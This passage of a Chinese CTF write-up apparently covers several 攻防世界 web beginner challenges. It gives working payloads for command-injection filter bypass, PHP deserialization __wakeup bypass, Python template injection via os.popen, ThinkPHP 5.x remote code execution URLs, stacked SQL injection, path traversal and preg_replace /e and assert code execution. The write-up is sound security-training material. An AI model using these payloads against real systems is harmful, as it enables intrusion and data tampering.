+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ctf</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&quot;ping&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;l&quot;&quot;s$&#123;IFS&#125;fl&quot;&quot;ag_1s_here&#x27;</span>));<br></code></pre></td></tr></table></figure>
+
+<img src="image-20230313091603555.png" srcset="/img/loading.gif" lazyload alt="image-20230313091603555" style="zoom:50%;" />
+
+<p>构造cat flag_1s_here&#x2F;flag_831b69012c67b35f.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ctf</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ease</span>(<span class="hljs-string">&quot;ping&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;c&quot;&quot;at$&#123;IFS&#125;f&quot;&quot;lag_1s_here$(printf$&#123;IFS&#125;&quot;\57&quot;)f&quot;&quot;lag_831b69012c67b35f.p&quot;&quot;hp&#x27;</span>));<br></code></pre></td></tr></table></figure>
+
+<img src="image-20230313091747429.png" srcset="/img/loading.gif" lazyload alt="image-20230313091747429" style="zoom:50%;" />
+
+
+
+<h3 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h3><h4 id="php反序列化-1"><a href="#php反序列化-1" class="headerlink" title="php反序列化"></a>php反序列化</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123; <br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>; <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-literal">true</span>); <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;                         <span class="hljs-comment">//file不等于index.php设置为index.php，需绕过</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123; <br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>; <br>        &#125; <br>    &#125; <br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123; <br>    <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]); <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$var</span>)) &#123;            <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;stop hacking!&#x27;</span>);    <span class="hljs-comment">//匹配以字母o或字母c开头，后跟一个冒号，再后跟一个或多个数字，最后再跟一个冒号的子串</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>); <br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;index.php&quot;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;fl4g.php&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;O:4&#x27;</span>, <span class="hljs-string">&#x27;O:+4&#x27;</span>,<span class="hljs-variable">$a</span>);     <span class="hljs-comment">//绕过preg_match()函数</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:1:&#x27;</span>, <span class="hljs-string">&#x27;:2:&#x27;</span>,<span class="hljs-variable">$a</span>); 		<span class="hljs-comment">//绕过__wakeup()函数</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><h4 id="代码审计及解密"><a href="#代码审计及解密" class="headerlink" title="代码审计及解密"></a>代码审计及解密</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$miwen</span>=<span class="hljs-string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-variable">$_o</span>=<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$str</span>);              <span class="hljs-comment">//反转字符串</span><br>    <span class="hljs-comment">// echo $_o;     </span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$_0</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$_0</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_o</span>);<span class="hljs-variable">$_0</span>++)&#123;  <br>        <span class="hljs-variable">$_c</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_o</span>,<span class="hljs-variable">$_0</span>,<span class="hljs-number">1</span>);     <span class="hljs-comment">//遍历字符串字符</span><br>        <span class="hljs-variable">$__</span>=<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$_c</span>)+<span class="hljs-number">1</span>;            <span class="hljs-comment">//字符ASCII值+1</span><br>        <span class="hljs-variable">$_c</span>=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$__</span>);              <span class="hljs-comment">//ASCII值返回字符</span><br>        <span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_c</span>;                  <span class="hljs-comment">//连接组成新字符串</span><br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_</span>)));       <br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   逆向加密算法，解密$miwen就是flag</span><br><span class="hljs-comment">*/</span><br>?<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$miwen</span>=<span class="hljs-string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-variable">$_o</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-variable">$str</span>)));;       <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$_0</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$_0</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_o</span>);<span class="hljs-variable">$_0</span>++)&#123;      <br>        <span class="hljs-variable">$_c</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_o</span>,<span class="hljs-variable">$_0</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$__</span>=<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$_c</span>)-<span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$_c</span>=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$__</span>);<br>        <span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_c</span>;	<br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$_</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">decode</span>(<span class="hljs-variable">$miwen</span>)<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h3><h4 id="python模板注入"><a href="#python模板注入" class="headerlink" title="python模板注入"></a>python模板注入</h4>4确认存在模板注入漏洞
+
+<img src="image-20230313111017306.png" srcset="/img/loading.gif" lazyload alt="image-20230313111017306" style="zoom:50%;" />
+
+<p>查看所有模块 <code>&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</code>      </p>
+<p>选用 <strong>os.popen</strong>，从所有模块中找到**&lt;class ‘site._Printer’&gt;**，为71</p>
+<p><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()&#125;&#125;</code></p>
+<p><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()&#125;&#125;</code></p>
+<h3 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h3><h4 id="thinkphp-v5-x-远程代码执行漏洞"><a href="#thinkphp-v5-x-远程代码执行漏洞" class="headerlink" title="thinkphp v5.x 远程代码执行漏洞"></a>thinkphp v5.x 远程代码执行漏洞</h4><p><a target="_blank" rel="noopener" href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection</a></p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://61.147.171.105:63639/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class="hljs-string">0</span>]=system&amp;vars[1][]=find / -name flag<br><span class="hljs-link">http://61.147.171.105:63639/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class="hljs-string">0</span>]=system&amp;vars[1][]=cat /flag<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h3><h4 id="SQL注入（堆叠注入）"><a href="#SQL注入（堆叠注入）" class="headerlink" title="SQL注入（堆叠注入）"></a>SQL注入（堆叠注入）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show databases#</span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">show</span> tables#<br><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show columns from `1919810931114514`#</span><br><span class="hljs-string"></span><br><span class="hljs-string">//和web被查询的表互换</span><br><span class="hljs-string">1&#x27;</span>;rename tables `words` <span class="hljs-keyword">to</span> `words1`;rename tables `<span class="hljs-number">1919810931114514</span>` <span class="hljs-keyword">to</span> `words`; <span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> `words` change `flag` `id` <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>);#<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];      <span class="hljs-comment">//设置白名单</span><br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;                   <span class="hljs-comment">//$page是否存在并且为字符串类型</span><br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;             <br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );                                       <span class="hljs-comment">//以?分割存在白名单中</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;                                   <span class="hljs-comment">//分割存在白名单中返回true</span><br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$page</span>);<br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])                      <br>        &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])                 <span class="hljs-comment">//存在file参数且为字符串</span><br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<img src="image-20230313193542911.png" srcset="/img/loading.gif" lazyload alt="image-20230313193542911" style="zoom:50%;" />
+
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">source</span>.php?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">source</span>.php?..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../ffffllllaaaagggg<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h3><h4 id="Git代码泄露以及PHP-x3D-x3D-比较绕过"><a href="#Git代码泄露以及PHP-x3D-x3D-比较绕过" class="headerlink" title="Git代码泄露以及PHP &#x3D;&#x3D; 比较绕过"></a>Git代码泄露以及PHP &#x3D;&#x3D; 比较绕过</h4><p>扫描发现&#x2F;.git&#x2F;路径，使用GitHack得到源码</p>
+<p>进行代码审计，发现可通过绕过 &#x3D;&#x3D; 增加金钱，购买flag</p>
+<p><img src="/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230313205338816.png" srcset="/img/loading.gif" lazyload alt="image-20230313205338816"></p>
+<img src="image-20230313205643826.png" srcset="/img/loading.gif" lazyload alt="image-20230313205643826" style="zoom:50%;" />
+
+<p><strong>使用[true,true,true,true,true,true,true]绕过 &#x3D;&#x3D;</strong></p>
+<p><img src="/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230313205041049.png" srcset="/img/loading.gif" lazyload alt="image-20230313205041049"></p>
+<h3 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h3><h4 id="PHP文件包含及preg-replace方法漏洞"><a href="#PHP文件包含及preg-replace方法漏洞" class="headerlink" title="PHP文件包含及preg_replace方法漏洞"></a>PHP文件包含及preg_replace方法漏洞</h4><p>存在文件包含漏洞</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">61.147</span>.<span class="hljs-number">171.105</span>:<span class="hljs-number">51483</span><span class="hljs-regexp">/index.php?page=php:/</span><span class="hljs-regexp">/filter/</span>read=convert.base64-encode/resource=index.php<br></code></pre></td></tr></table></figure>
+
+<p>得到index.php源码</p>
+<p><img src="/2023/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web%E5%85%A5%E9%97%A8/image-20230313213352601.png" srcset="/img/loading.gif" lazyload alt="image-20230313213352601"></p>
+<p>解码base64得到核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;      <span class="hljs-comment">//添加X-Forwarded-For头</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-variable">$_GET</span>[pat];<br>    <span class="hljs-variable">$replacement</span> = <span class="hljs-variable">$_GET</span>[rep];<br>    <span class="hljs-variable">$subject</span> = <span class="hljs-variable">$_GET</span>[sub];                   <span class="hljs-comment">//get请求添加三个参数</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$pattern</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$replacement</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$subject</span>)) &#123;         <br>        <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$subject</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>其中<strong>preg_replace方法存在漏洞</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">preg_replace 函数执行一个正则表达式的搜索和替换<br><br><span class="hljs-keyword">mixed</span> <span class="hljs-title function_ invoke__">preg_replace</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$pattern</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$replacement</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$subject</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$limit</span> = -<span class="hljs-number">1</span> [, <span class="hljs-keyword">int</span> &amp;<span class="hljs-variable">$count</span> ]] )<br><br>搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。<br><br>• <span class="hljs-variable">$pattern</span>: 要搜索的模式，可以是字符串或一个字符串数组。<br>• <span class="hljs-variable">$replacement</span>: 用于替换的字符串或字符串数组。<br>• <span class="hljs-variable">$subject</span>: 要搜索替换的目标字符串或字符串数组。<br>• <span class="hljs-variable">$limit</span>: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-<span class="hljs-number">1</span>（无限制）。<br>• <span class="hljs-variable">$count</span>: 可选，为替换执行的次数。<br><br>然而这个函数有个漏洞<br>当<span class="hljs-variable">$pattern</span>使用了/e修正符，替换的时候会把<span class="hljs-variable">$replacement</span>替换进去的代码当成php代码执行，当然要构成合法的php代码才能正确执行。<br></code></pre></td></tr></table></figure>
+
+<p>构造</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">61.147</span>.<span class="hljs-number">171.105</span>:<span class="hljs-number">51483</span><span class="hljs-regexp">/index.php?pat=/</span><span class="hljs-number">123</span>/e&amp;rep=system(<span class="hljs-string">&#x27;ls&#x27;</span>)&amp;sub=<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure>
+
+<img src="image-20230313214019196.png" srcset="/img/loading.gif" lazyload alt="image-20230313214019196" style="zoom:50%;" />
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">61.147</span>.<span class="hljs-number">171.105</span>:<span class="hljs-number">51483</span><span class="hljs-regexp">/index.php?pat=/</span><span class="hljs-number">123</span><span class="hljs-regexp">/e&amp;rep=system(&#x27;cd s3chahahaDir/</span>flag%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>cat flag.php<span class="hljs-string">&#x27;)&amp;sub=123</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h3><h4 id="Git代码泄露以及assert命令注入"><a href="#Git代码泄露以及assert命令注入" class="headerlink" title="Git代码泄露以及assert命令注入"></a>Git代码泄露以及assert命令注入</h4><p>git源代码泄露，进行代码分析</p>
+<img src="image-20230314084124938.png" srcset="/img/loading.gif" lazyload alt="image-20230314084124938" style="zoom:50%;" />
+
+<p>构造请求</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">page</span>=abc&#x27;) <span class="hljs-keyword">or</span> system(<span class="hljs-string">&quot;cat templates/flag.php&quot;</span>);//<br></code></pre></td></tr></table></figure>
+
+<p>使得assert执行为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;file_exists(&#x27;templates/abc&#x27;) or system(&quot;</span>cat templates/flag.php<span class="hljs-string">&quot;);//.php&#x27;)&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;That file doesn&#x27;t exist!&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+
+
